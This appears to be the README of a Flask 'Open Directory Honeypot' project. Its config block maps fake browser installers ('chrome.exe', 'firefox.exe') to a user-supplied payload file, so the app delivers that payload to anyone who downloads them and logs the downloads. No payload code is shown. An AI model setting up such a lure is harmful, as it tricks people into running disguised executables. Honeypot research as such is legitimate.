# 🗂️ Open Directory Honeypot ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white)

## 🧩 Features

- Delivering your **payload**
- Logging of all downloads

## 📥 Deployment
```sh
git clone https://github.com/clienthold/OpenDirectory.git
cd OpenDirectory
```

edit the ```config.py``` configure

```python
HONEYPOT_LIST = ["chrome.exe", "firefox.exe"] # LIST OF FILES
PAYLOAD_PATH = "" # PATH FOR PAYLOAD FILE
LOG_FILE = "honeypot.log" # PATH FOR LOG FILE
```

### 🐧 For linux (gunicorn)
```sh
pip3 install -r requirements.txt
pip3 install gunicorn
gunicorn --bind=0.0.0.0:8080 honeypot:app
```

### 🪟 For windows (waitress)
```
pip install -r requirements.txt
pip install waitress
waitress-serve --listen=*:8080 honeypot:app
```
